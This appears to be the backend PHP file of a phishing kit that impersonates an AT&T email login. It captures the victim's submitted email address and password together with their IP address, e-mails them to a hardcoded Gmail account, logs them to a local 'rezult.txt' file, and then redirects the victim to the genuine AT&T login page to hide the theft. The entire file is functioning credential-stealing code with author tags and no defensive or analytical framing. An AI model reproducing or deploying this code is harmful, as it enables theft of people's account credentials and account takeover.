<?php   ob_start();  ?>
<?
include "v-V-v.php";
?>
<?
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------- AT&&T Details  ---------------\n";
$message .= "|Email Address  : ".$_POST['userid']."\n";
$message .= "|Email Password : ".$_POST['password']."\n";
$message .= "--------xX CREATED BY AQUILA Xx--------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | MR.AQUILA: ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "--------------------------------------------------\n";

$send="curmichael91@gmail.com";
$subject = "SMTP | ".$_POST['username']." | $ip";
$headers = "From: aq+uila<noreply@spammersupport.info>";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("../rezult.txt","a");
fputs($fp,$message);
fclose($fp);
@header("Location: https://loginprodx.att.net/commonLogin/igate_edam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%253A%252F%252Flogin.yahoo.com%252Fsaml%252F2.0%252Fatt%26.lang%3Den-US%26Target%3Dhttps%253A%252F%252Fcurrently.att.yahoo.com%252F%3Ftucd567%3Dw&REFERER=https%3A%2F%2Fcurrently.att.yahoo.com%2F&HOSTNAME=loginprodx.att.net&AUTHNLEVEL=&FAILREASON=&PROTOCOL=https&OLDSESSION=");

	 
?>